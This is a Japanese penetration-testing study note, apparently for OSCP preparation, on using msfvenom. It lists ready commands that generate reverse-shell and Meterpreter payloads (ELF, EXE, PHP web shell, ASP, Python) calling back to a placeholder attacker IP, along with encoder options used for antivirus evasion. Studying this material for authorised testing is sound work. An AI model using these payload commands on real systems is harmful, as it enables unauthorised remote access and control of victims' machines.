関連ノート：
- [[Module 16：Antivirus Evasion#Veil-frameworkを使ったAV evasion]]

# 概要・特徴

- `msfvenom` は、Metasploit Framework の一部でありながら、単独でも使用できるペイロード生成ツール
- 様々なプラットフォーム向けのリバースシェルやバインドシェルを含む、豊富な形式・構造のペイロードを生成できる（exe, elf, asp, war, php, py, raw など）
- エンコードや出力形式のカスタマイズも対応
- OSCP試験で利用制限なし（multi handlerも）：[Metasploit Restrictions - OffSec](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#metasploit-restrictions)

---

# 前提：パラメタ解説

| パラメタ     | 説明                                                                                     |
| -------- | -------------------------------------------------------------------------------------- |
| LHOST    | リスナー（待ち受け）を起動する側のIPアドレス。ローカルネットワークならLAN IP、インターネット越しならグローバルIP（WAN）を指定。                 |
| LPORT    | リスナーが接続を受け付けるポート番号。任意の空いているポートを指定可能。                                                   |
| RHOST    | 攻撃対象（ターゲット）マシンのIPアドレス。                                                                 |
| RPORT    | 攻撃対象マシンでサービスが動作しているポート番号。多くのExploitやスキャナではあらかじめ設定済みのことが多い。                             |
| SRVHOST  | 攻撃を仕掛ける側（自分の）マシンのIPアドレス。HTTPサーバーなどでファイル提供する場合などに使用。                                    |
| SRVPORT  | 自分のマシン上で使うポート番号。たとえばexploitで使うHTTPサーバーなどに利用。                                           |
| URIPATH  | URLの末尾部分に指定する文字列。例：`http://192.168.0.1:8080/malware` で `malware` の部分。                  |
| EXITFUNC | ペイロード終了後に呼び出す終了関数の種類を指定。クリーンな終了が必要な場合に重要。<br>指定しない場合はペイロードにあわせてthreadかprocessが自動選択される。 |

## EXITFUNCの用途別一覧

| EXITFUNC | 想定シナリオ                                                                   | 動作の特徴・目的                                                                           |
| -------- | ------------------------------------------------------------------------ | ---------------------------------------------------------------------------------- |
| None     | 複数のペイロードを連結して流すときまたは終了処理が不要なケース                                          | `GetLastError()` を呼ぶだけ。スレッドやプロセスは終了しないため、次のペイロードがそのまま続けて実行される。<br>→ 例：自作の多段攻撃コードなど |
| Thread   | 対象プロセスを落とさずに、安定した状態で終了させたいとき（例：IEの脆弱性を突く）                                | スレッド単位で終了する。<br>→ 例：ユーザーが使っているIEやOfficeをクラッシュさせたくない。バックグラウンドでこっそり実行。               |
| Process  | 実行後にプロセスを完全終了させても良い or すべきケース（例：`multi/handler`、自動再起動がある）                | プロセス全体を終了する（`ExitProcess` 呼び出し）。<br>→例：自己再起動するWindowsサービスのExploitなど。               |
| SEH      | ターゲットがStructured Exception Handler（SEH）で例外処理していて、クラッシュしても自動で再起動するようなプロセス | エラーが発生したらOSやアプリ側が自動でリカバリしてくれることを利用。<br>アプリのプロセスを落とす必要なしに、例外を使って自動復旧させられる。          |


---

# 基本構文

```zsh
msfvenom -p <payload> -f <format> -e <encoder> -o <output_file>
```

例：
```zsh
sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell.c LHOST=<AttackerIP> LPORT=<Port>
```

| オプション | 意味                                                                                 |
| ----- | ---------------------------------------------------------------------------------- |
| `-p`  | 使用するペイロードの指定                                                                       |
| `-f`  | 出力フォーマット（exe, elf, raw など）                                                         |
| `-e`  | エンコード形式                                                                            |
| `-o`  | 出力ファイル名とパス                                                                         |
| `-b`  | 生成コードに指定したbad charsを含まない<br>（bad chars：`\x00`（=null）など、制御文字として解釈されてしまう恐れがある文字列のこと） |

---

# ペイロードについて

- [[5. AV Evasion：Shellcode#Staged / Stageless Payloads]]

ペイロードの命名規則
```zsh
<OS>/<Architecture>/<payload>
```

|例|説明|
|---|---|
|`linux/x86/shell_reverse_tcp`|Linux（x86）用、stageless のリバースシェル|
|`windows/x64/meterpreter/reverse_tcp`|Windows（x64）用、staged の Meterpreter|
|`windows/shell_reverse_tcp`|Windows（x86）は arch 省略可能|

---

# 出力形式とエンコーダ

出力可能な形式一覧
```zsh
msfvenom --list formats
```

エンコーダ一覧の表示
```zsh
msfvenom --list encoders
```

例：PHPペイロードを Base64 でエンコード
```zsh
msfvenom -p php/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f raw -e php/base64
```

---

# ペイロード具体例

| ターゲット         | コマンド例                                                                                                       | 備考                   |
| ------------- | ----------------------------------------------------------------------------------------------------------- | -------------------- |
| Linux (x86)   | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f elf -o rev_shell.elf`     | ELF形式                |
| Windows (x86) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f exe -o rev_shell.exe`       | exe形式                |
| Windows (x64) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f exe -o rev_shell64.exe` | 明示的にx64を指定           |
| PHP           | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f raw -o rev_shell.php`           | Webシェルとして利用可能        |
| ASP           | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f asp -o rev_shell.asp`       | WebサーバがWindowsの場合に使用 |
| Python        | `msfvenom -p cmd/unix/reverse_python LHOST=<AttackerIP> LPORT=<Port> -f raw -o rev_shell.py`                | UNIX系ターゲット用          |

---

# 🚨注意点

- 出力されたコードの一部に問題がある場合があるので検証すること（例：PHPで `<?php` がコメントアウトされているなど）
- 常に内容を確認し、必要があれば手動で修正すること
- `uname -a` でターゲットマシンの OS・アーキテクチャを確認し、それに適したペイロードを選ぶこと